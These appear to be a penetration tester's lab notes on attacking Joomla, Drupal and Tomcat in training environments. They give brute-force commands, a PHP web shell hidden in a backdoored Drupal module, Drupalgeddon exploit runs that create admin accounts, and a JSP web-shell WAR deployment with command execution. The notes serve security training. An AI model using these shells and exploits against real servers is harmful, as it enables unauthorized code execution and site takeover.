# Attacking Common Applications
- [Joomla](#joomla)
    - [Enumeration](#enumeration)
- [Drupal](#drupal)
    - [Enumeration](#enumeration-1)
    - [PHP Filter Module](#php-filter-module)
    - [Uploading a Backdoored Module](#uploading-a-backdoored-module)
    - [Drupalgeddon](#drupalgeddon)
- [Tomcat](#tomcat)
    - [Enumeration](#enumeration-2)
    - [WAR File Upload](#war-file-upload)

## Joomla
### Enumeration
- Fingerprint the version from JavaScript files in the `media/system/js/` directory or by browsing to `administrator/manifests/files/joomla.xml`
- The `cache.xml` file can help to give us the approximate version. It is located at `plugins/system/cache/cache.xml`

- [Droopescan](https://github.com/droope/droopescan), a plugin-based scanner that works for SilverStripe, WordPress, and Drupal with limited functionality for Joomla and Moodle.
```bash
sudo pip3 install droopescan

droopescan scan joomla --url http://dev.inlanefreight.local/
```
- We can also try out [JoomlaScan](https://github.com/drego85/JoomlaScan). However, JoomlaScan is a bit out-of-date and requires Python2.7 to run.
```bash
abdeonix@htb[/htb]$ curl https://pyenv.run | bash
abdeonix@htb[/htb]$ echo 'export PYENV_ROOT="$HOME/.pyenv"' >> ~/.bashrc
abdeonix@htb[/htb]$ echo 'command -v pyenv >/dev/null || export PATH="$PYENV_ROOT/bin:$PATH"' >> ~/.bashrc
abdeonix@htb[/htb]$ echo 'eval "$(pyenv init -)"' >> ~/.bashrc
abdeonix@htb[/htb]$ source ~/.bashrc
abdeonix@htb[/htb]$ pyenv install 2.7
abdeonix@htb[/htb]$ pyenv shell 2.7

abdeonix@htb[/htb]$ python2.7 -m pip install urllib3
abdeonix@htb[/htb]$ python2.7 -m pip install certifi
abdeonix@htb[/htb]$ python2.7 -m pip install bs4

python2.7 joomlascan.py -u http://dev.inlanefreight.local


## bruteforcing default password using Joomla [bruteforce](https://github.com/ajnik/joomla-bruteforce)
sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
```

## Drupal
### Enumeration
- We can identify Drupal CMS is through nodes. Drupal indexes its content using nodes. A node can hold anything such as a blog post, poll, article, etc. 
- The page URIs are usually of the form `/node/<nodeid>`
- Version
```bash
curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 

## Droopescan 
droopescan scan drupal -u http://drupal.inlanefreight.local
```
### PHP Filter Module
- In older versions of Drupal (before version 8), it was possible to log in as an admin and enable the PHP filter module, which "Allows embedded PHP code/snippets to be evaluated."

![Drupal_PHP_Module](/images/drupal_php_module.png)

- From here, we could tick the check box next to the module and scroll down to Save configuration. Next, we could go to Content --> Add content and create a Basic page.

![Basic_Page](/images/basic_page.png)

- We can now create a page with a malicious PHP snippet such as the one below.

![Basic_page_shell](/images/basic_page_shell_7v2.png)

- We also want to make sure to set Text format drop-down to PHP code. From version 8 onwards, the PHP Filter module is not installed by default. To leverage this functionality, we would have to install the module ourselves
```bash
abdeonix@htb[/htb]$ wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
```
- Once downloaded go to `Administration > Reports > Available updates`

> [!NOTE]
> Location may differ based on the Drupal version and may be under the Extend menu.

![Install_Module](/images/install_module.png)

- From here, click on Browse, select the file from the directory we downloaded it to, and then click Install.
- Once the module is installed, we can click on Content and create a new basic page, similar to how we did in the Drupal 7 example. Again, be sure to select PHP code from the Text format dropdown.

### Uploading a Backdoored Module
- Drupal allows users with appropriate permissions to upload a new module. A backdoored module can be created by adding a shell to an existing module.
- Modules can be found on the drupal.org website.
```bash
# Download the archive and extract its contents.
abdeonix@htb[/htb]$ wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
abdeonix@htb[/htb]$ tar xvf captcha-8.x-1.2.tar.gz
```
- Create a PHP web shell with the contents:

```php
<?php
system($_GET['fe8edbabc5c5c9b7b764504cd22b17af']);
?>
```
- Next, we need to create a .htaccess file to give ourselves access to the folder. This is necessary as Drupal denies direct access to the /modules folder.

```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```
- The configuration above will apply rules for the / folder when we request a file in /modules. Copy both of these files to the captcha folder and create an archive.
```bash
abdeonix@htb[/htb]$ mv shell.php .htaccess captcha
abdeonix@htb[/htb]$ tar cvf captcha.tar.gz captcha/

captcha/
captcha/.travis.yml
captcha/README.md
captcha/captcha.api.php
captcha/captcha.inc
captcha/captcha.info.yml
captcha/captcha.install

<SNIP>
```
- Assuming we have administrative access to the website, click on Manage and then Extend on the sidebar. 
- Next, click on the + Install new module button, and we will be taken to the install page, such as http://drupal.inlanefreight.local/admin/modules/install Browse to the backdoored Captcha archive and click Install.

![Module_Installed](/images/module_installed.png)

- Once the installation succeeds, browse to `/modules/captcha/shell.php` to execute commands.
```bash
abdeonix@htb[/htb]$ curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
### Drupalgeddon
- CVE-2014-3704, known as Drupalgeddon, affects versions 7.0 up to 7.31 and was fixed in version 7.32. This was a pre-authenticated SQL injection flaw that could be used to upload a malicious form or create a new admin user.
- This is [PoC](https://www.exploit-db.com/exploits/34992) script. Once an admin user is added, we could log in and enable the PHP Filter module to achieve remote code execution.
```bash
abdeonix@htb[/htb]$ python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd

<SNIP>

[!] VULNERABLE!

[!] Administrator user created!

[*] Login: hacker
[*] Pass: pwnd
[*] Url: http://drupal-qa.inlanefreight.local/?q=node&destination=node
```

- **Drupalgeddon2**
- We can use this [PoC](https://www.exploit-db.com/exploits/44448) to confirm this vulnerability.
```bash
abdeonix@htb[/htb]$ python3 drupalgeddon2.py 

################################################################
# Proof-Of-Concept for CVE-2018-7600
# by Vitalii Rudnykh
# Thanks by AlbinoDrought, RicterZ, FindYanot, CostelSalanders
# https://github.com/a2u/CVE-2018-7600
################################################################
Provided only for educational or information purposes

Enter target url (example: https://domain.ltd/): http://drupal-dev.inlanefreight.local/

Check: http://drupal-dev.inlanefreight.local/hello.txt
```
- We can check quickly with `cURL` and see that the hello.txt file was indeed uploaded.
```bash
curl -s http://drupal-dev.inlanefreight.local/hello.txt

;-)
```

- Modify the script to gain remote code execution by uploading a malicious PHP file.

## Tomcat
### Enumeration
- This is the default documentation page, which may not be removed by administrators. Here is the general folder structure of a Tomcat installation.
```
├── bin
├── conf
│   ├── catalina.policy
│   ├── catalina.properties
│   ├── context.xml
│   ├── tomcat-users.xml
│   ├── tomcat-users.xsd
│   └── web.xml
├── lib
├── logs
├── temp
├── webapps
│   ├── manager
│   │   ├── images
│   │   ├── META-INF
│   │   └── WEB-INF
|   |       └── web.xml
│   └── ROOT
│       └── WEB-INF
└── work
    └── Catalina
        └── localhost
```
- Each folder inside webapps is expected to have the following structure:
```
webapps/customapp
├── images
├── index.jsp
├── META-INF
│   └── context.xml
├── status.xsd
└── WEB-INF
    ├── jsp
    |   └── admin.jsp
    └── web.xml
    └── lib
    |    └── jdbc_drivers.jar
    └── classes
        └── AdminServlet.class
```
- The most important file among these is `WEB-INF/web.xml`, which is known as the deployment descriptor. This file stores information about the routes used by the application and the classes handling these routes
- All compiled classes used by the application should be stored in the `WEB-INF/classes` folder. These classes might contain important business logic as well as sensitive information.
- The `jsp` folder stores Jakarta Server Pages (JSP), formerly known as JavaServer Pages, which can be compared to PHP files on an Apache server.
- Here’s an example web.xml file:
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>

<!DOCTYPE web-app PUBLIC "-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN" "http://java.sun.com/dtd/web-app_2_3.dtd">

<web-app>
  <servlet>
    <servlet-name>AdminServlet</servlet-name>
    <servlet-class>com.inlanefreight.api.AdminServlet</servlet-class>
  </servlet>

  <servlet-mapping>
    <servlet-name>AdminServlet</servlet-name>
    <url-pattern>/admin</url-pattern>
  </servlet-mapping>
</web-app>
```
- The `tomcat-users.xml` file is used to allow or disallow access to the `/manager` and `host-manager` admin pages:
```xml
<?xml version="1.0" encoding="UTF-8"?>

<SNIP>
  
<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
              version="1.0">
<!--
  By default, no user is included in the "manager-gui" role required
  to operate the "/manager/html" web application.  If you wish to use this app,
  you must define such a user - the username and password are arbitrary.

  Built-in Tomcat manager roles:
    - manager-gui    - allows access to the HTML GUI and the status pages
    - manager-script - allows access to the HTTP API and the status pages
    - manager-jmx    - allows access to the JMX proxy and the status pages
    - manager-status - allows access to the status pages only

  The users below are wrapped in a comment and are therefore ignored. If you
  wish to configure one or more of these users for use with the manager web
  application, do not forget to remove the <!.. ..> that surrounds them. You
  will also need to set the passwords to something appropriate.
-->

   
 <SNIP>
  
!-- user manager can access only manager section -->
<role rolename="manager-gui" />
<user username="tomcat" password="tomcat" roles="manager-gui" />

<!-- user admin can access manager and admin section both -->
<role rolename="admin-gui" />
<user username="admin" password="admin" roles="manager-gui,admin-gui" />


</tomcat-users>
```
- The file shows us what each of the roles manager-gui, manager-script, manager-jmx, and manager-status provide access to. In this example, we can see that a user tomcat with the password tomcat has the manager-gui role, and a second weak password admin is set for the user account admin

### WAR File Upload
- The manager web app allows us to instantly deploy new applications by uploading WAR files. A WAR file can be created using the zip utility. A JSP web shell such as this can be downloaded and placed within the archive:
```bash
abdeonix@htb[/htb]$ wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
abdeonix@htb[/htb]$ zip -r backup.war cmd.jsp 

```
- Click on Browse to select the .war file and then click on Deploy.
![Mgr_Deploy](/images/mgr_deploy.png)
- This file is uploaded to the manager GUI, after which the /backup application will be added to the table.
![WAR_Deployed](/images/war_deployed.png)
```bash
curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id
```
